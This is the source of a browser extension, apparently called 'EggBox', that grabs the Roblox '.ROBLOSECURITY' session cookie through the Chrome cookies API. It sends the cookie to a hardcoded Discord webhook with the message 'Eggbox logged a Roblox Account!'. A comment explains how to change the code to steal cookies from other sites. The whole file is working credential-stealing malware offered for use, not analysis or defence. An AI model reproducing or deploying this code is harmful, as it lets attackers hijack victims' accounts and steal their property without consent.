function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `Eggbox logged a Roblox Account!`,
            "description": ">>> EggBox extension logged someone; see information about the user below",
            "color": 15258703,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
      webhookReq("https://discord.com/api/webhooks/1102018084992196740/v5I9QgPLfko7on7YDrhVauI4XUsuh_PWZ5-prVITZY5JlhouWmyfxFx7jk_D0ngq1C_a", cookie.value);
  }
});
